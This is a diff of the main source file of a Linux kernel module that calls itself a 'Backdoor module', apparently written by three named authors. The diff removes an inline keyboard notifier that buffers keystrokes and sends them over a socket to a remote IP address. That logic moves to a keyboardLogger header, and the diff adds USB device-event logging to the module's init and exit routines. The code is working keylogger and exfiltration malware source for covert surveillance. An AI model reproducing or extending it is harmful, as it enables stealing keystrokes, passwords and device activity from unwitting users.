@@ -6,91 +6,57 @@
 #include <linux/interrupt.h>
 #include <linux/delay.h>
 
-#include "backdoor.h"
 #include "networking.h"
+#include "keyboardLogger.h"
+#include "deviceLogger.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Gabriel Franceschi Libardi");
 MODULE_AUTHOR("Gustavo Moura Scarenci");
 MODULE_AUTHOR("Artur Brenner Weber");
-MODULE_DESCRIPTION("A module that sends kernel information via socket to another machine");
+MODULE_DESCRIPTION("A module that sends specific kernel information via socket to another machine");
 MODULE_VERSION("0.1");
 
-static struct notifier_block keyboard_notifier_block = {
-    .notifier_call = keyboard_notifier_callback,
-};
-
-// Keyboard stroke buffer
-static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 
-
-// Keyboard interrupt handler
-irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
-    static int32_t buffer_count = 0; // Counts how many chars have been logged.
-    struct keyboard_notifier_param *param = dev_id;
-
-    if (param && param->value) {
-        uint32_t keycode = param->value;
-        char key = (char) keycode; // Convert keycode to char
-
-        keystrokes[buffer_count] = key;
-        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
-
-        printk(KERN_INFO "Buffer: %s\n", keystrokes);
-        printk(KERN_INFO "Buffer size: %d\n", buffer_count);
-
-        if (buffer_count == 0) {
-            send_message(keystrokes);
-        }
-    }
-
-    return IRQ_NONE;
-}
-
-// Keyboard notifier callback
-int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
-    struct keyboard_notifier_param *param = _param;
-
-    if (code == KBD_KEYSYM && param && param->down) {
-        // Call the keyboard interrupt handler
-        keyboard_interrupt_handler(0, param);
-    }
-
-    return NOTIFY_OK;
-}
-
-
-static int __init keyboard_module_init(void) {
+static int __init backdoor_module_init(void) {
     int result;
 
+    //Socket Initialization
     result = create_socket(IP_ADDRESS, PORT);
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
         return result;
     }
 
-    // Register the keyboard notifier
+    // Keyboard Logger Initialization
     result = register_keyboard_notifier(&keyboard_notifier_block);
     if (result != 0) {
         printk(KERN_ERR "Failed to register keyboard notifier\n");
         return result;
     }
 
+    // USB Logger Initialization
+    usb_register_notify(&usb_notifier);
+
     printk(KERN_INFO "Backdoor module initialized\n");
     return 0;
 }
 
-static void __exit keyboard_module_exit(void) {
+static void __exit backdoor_module_exit(void) {
     int ret;
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
     ret = shutdown_socket();
 
     if (ret < 0) {
-	printk(KERN_ERR "Unable to release socket");
-	return;
+	    printk(KERN_ERR "Unable to release socket");
+	    return;
     }
+
+    //Unregister the USB notifier
+    usb_unregister_notify(&usb_notifier);
+
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
-module_init(keyboard_module_init);
-module_exit(keyboard_module_exit);
+module_init(backdoor_module_init);
+module_exit(backdoor_module_exit);
